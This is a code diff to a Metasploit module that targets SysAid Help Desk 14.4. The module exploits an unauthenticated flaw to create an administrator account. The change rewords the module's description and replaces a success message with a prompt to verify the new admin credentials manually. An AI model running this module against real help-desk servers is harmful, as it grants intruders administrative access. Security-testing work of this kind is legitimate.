@@ -14,10 +14,10 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name' => 'SysAid Help Desk Administrator Account Creation',
       'Description' => %q{
-        This module exploits a vulnerability in SysAid Help Desk that allows an
-        unauthenticated user to create an administrator account. Note that this
-        exploit will only work once! Any subsequent attempts will fail.
-        This module has been tested on SysAid 14.4 in Windows and Linux.
+        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
+        user to create an administrator account. Note that this exploit will only work once. Any
+        subsequent attempts will fail. On the other hand, the credentials must be verified
+        manually. This module has been tested on SysAid 14.4 in Windows and Linux.
         },
       'Author' =>
         [
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
     })
     if res && res.code == 200 && res.body.to_s =~ /Error while creating account/
       # No way to know whether this worked or not, it always says error
-      print_good("#{peer} - Created administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+      print_status("#{peer} - The new administrator #{datastore['USERNAME']}:#{datastore['PASSWORD']} should be checked manually")
       service_data = {
         address: rhost,
         port: rport,
